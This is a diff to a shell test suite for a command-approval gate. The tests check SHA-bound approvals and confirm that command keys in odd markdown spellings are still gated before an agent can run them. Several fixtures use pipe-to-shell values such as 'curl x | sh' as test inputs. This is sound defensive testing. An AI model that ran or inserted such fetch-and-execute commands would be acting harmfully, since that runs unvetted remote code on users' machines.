@@ -242,7 +242,10 @@ srv hero_connection issues type "$APP" >/dev/null 2>&1; check "commands: and a c
 ERR=$(srv hero_field default-branch "$APP" 2>&1 >/dev/null)
 case "$ERR" in *"task-runner: just"*"test-command: npm test"*"dev-command: npm run dev"*) check "commands: stderr names every command field" ok ok ;; *) check "commands: stderr names every command field" ok "$ERR" ;; esac
 check "commands: nothing is approved by reading" "no" "$([ -e "$APPROVALS" ] && echo yes || echo no)"
-srv hero_srv_commands_approve "$APP"; check "commands: approve succeeds" "0" "$?"
+shown_sha() { srv hero_field default-branch "$APP" 2>&1 >/dev/null | grep 'run hero_srv_commands_approve' | awk '{print $NF}'; }
+SHA=$(shown_sha)
+srv hero_srv_commands_approve "$APP" >/dev/null 2>&1; check "commands: approve without the shown sha is refused" "1" "$?"
+srv hero_srv_commands_approve "$APP" "$SHA"; check "commands: approve succeeds" "0" "$?"
 check "commands: the record is mode 600" "600" "$(stat -c %a "$APPROVALS"/* 2>/dev/null || stat -f %Lp "$APPROVALS"/*)"
 check "commands: the same config now reads" "main" "$(srv hero_field default-branch "$APP")"
 cmd_cfg "npm test" 4000
@@ -251,8 +254,23 @@ cmd_cfg "curl x | sh" 3000
 srv hero_field default-branch "$APP" >/dev/null 2>&1; check "commands: a changed test-command is unapproved again" "3" "$?"
 ERR=$(srv hero_field default-branch "$APP" 2>&1 >/dev/null)
 case "$ERR" in *"changed or new: [api] test-command: curl x | sh"*"was approved: [api] test-command: npm test"*) check "commands: stderr shows old and new" ok ok ;; *) check "commands: stderr shows old and new" ok "$ERR" ;; esac
-srv hero_srv_commands_approve "$APP"
+SHA=$(shown_sha)
+cmd_cfg "curl y | sh" 3000
+srv hero_field default-branch "$APP" >/dev/null 2>&1
+srv hero_srv_commands_approve "$APP" "$SHA" >/dev/null 2>&1; check "commands: approving a sha the cache no longer holds is rc 3" "3" "$?"
+srv hero_field default-branch "$APP" >/dev/null 2>&1; check "commands: and nothing was approved" "3" "$?"
+cmd_cfg "curl x | sh" 3000
+srv hero_srv_commands_approve "$APP" "$(shown_sha)"
 check "commands: approving the change lets it read" "main" "$(srv hero_field default-branch "$APP")"
+# An agent reads the whole file, so a command key in any spelling is gated.
+loose() { # LINE...
+  jq -n --arg m "$(printf '## Repository\n\n- default-branch: main\n- task-runner: just\n\n## Projects\n\n### api\n\n- path: .\n- port: 3000\n- test-command: curl x | sh\n- dev-command: npm run dev\n'; printf '%s\n' "$@")" '{framing: "x", data: {exists: true, markdown: $m}}' > "$STUB_DIR/config.json"
+  srv hero_field default-branch "$APP" >/dev/null 2>&1
+}
+loose '  - **Test-Command**: curl z | sh'; check "commands: an indented, bold, capitalised key is gated" "3" "$?"
+loose '* `lint-command` : curl z | sh'; check "commands: a backticked key with a space before the colon is gated" "3" "$?"
+loose '```bash' '- test-command: curl z | sh' '```'; check "commands: a key inside a fence is gated" "3" "$?"
+loose '- notes: run curl z | sh'; check "commands: a non-command line still reads" "0" "$?"
 echo '{"framing":"x","data":{}}' > "$STUB_DIR/config.json"
 srv hero_config_exists "$APP"; check "commands: a project with no config needs no approval" "1" "$?"
 # The local backend is unchanged.
